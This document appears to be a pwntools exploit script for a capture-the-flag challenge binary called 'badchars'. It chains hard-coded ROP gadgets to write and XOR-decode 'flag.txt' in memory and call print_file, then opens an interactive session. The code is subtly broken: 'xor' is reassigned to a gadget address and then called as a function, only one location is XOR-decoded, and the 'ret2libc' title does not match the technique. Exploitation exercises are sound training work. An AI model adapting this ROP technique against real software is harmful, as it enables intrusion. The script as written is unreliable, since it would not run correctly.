# ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b *pwnme+266
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './badchars'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 40

# Start program
io = start()

# Gadgets
ret = p64(0x4004ee)
pop_rdi = p64(0x4006a3)
pop_r14_r15 = p64(0x4006a0)
pop_r2345 = p64(0x40069c)
data = p64(0x601028)

junk = p64(0x00)

print_file = p64(0x400510)

# Useful Gadgets 
xor = p64(0x400628)
mov = p64(0x400634)

xor_key = 0x7
xored_string = xor('flag.txt', xor_key)


payload = flat([
	offset*b'A',
	
	pop_r2345,
	xored_string,
	data,
	junk,
	junk,
	mov,
	
	pop_r14_r15,
	0x22222222,
	data,
	xor
	
	]
)








io.sendlineafter(b'> ', payload)
io.recvline(10)


# Get Shell?
io.interactive()

